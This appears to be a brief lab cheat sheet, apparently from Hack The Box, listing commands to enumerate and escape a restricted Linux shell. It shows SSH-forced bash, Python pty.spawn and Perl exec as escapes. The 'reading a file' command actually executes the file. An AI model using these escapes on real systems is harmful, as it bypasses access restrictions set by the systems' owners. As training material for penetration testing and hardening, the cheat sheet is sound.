# Escaping Restricted Shells

## Exported Variables

```shell
htb-user@ubuntu:~$ export -p
```

## [Listing Command Names](https://www.gnu.org/software/bash/manual/html_node/Programmable-Completion-Builtins.html#index-compgen)

```shell
htb-user@ubuntu:~$ compgen -c
```

## Listing Directory Contents

```shell
htb-user@ubuntu:~$ echo ~/*
```

## Reading a File

```shell
htb-user@ubuntu:~$ echo $(~/*.txt)
```

## SSH + Bash

```shell
my@attack:~$ ssh -t htb-user@10.129.205.109 "bash"
```

## SSH + Bash (No Profile)

```shell
my@attack:~$ ssh -t htb-user@10.129.205.109 "bash --noprofile --norc"
```

## Python

```shell
htb-user@ubuntu:~$ python3 -c 'import pty; pty.spawn("bash")'
```

## Perl

```shell
htb-user@ubuntu:~$ perl -e 'exec "bash";'
```
